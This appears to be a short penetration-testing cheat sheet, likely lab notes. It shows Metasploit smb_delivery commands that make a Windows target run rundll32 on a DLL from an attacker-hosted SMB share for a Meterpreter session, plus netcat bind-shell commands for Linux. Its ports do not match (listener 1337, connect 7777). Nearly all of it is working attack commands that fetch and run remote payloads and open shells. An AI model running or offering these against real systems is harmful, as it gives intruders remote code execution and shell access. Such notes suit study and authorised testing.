
# Metepreter (Windows)

```powershell
# attack host
msfconsole -q
use exploit/windows/smb/smb_delivery
set target 0
set SRVHOST <kali-IP>
exploit

# window (copy cmd from msfconsole output)
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

# Bind Shells

## Linux

```bash
# target
nc -lvnp 1337

# attack host to target
nc -nv 10.129.41.200 7777
```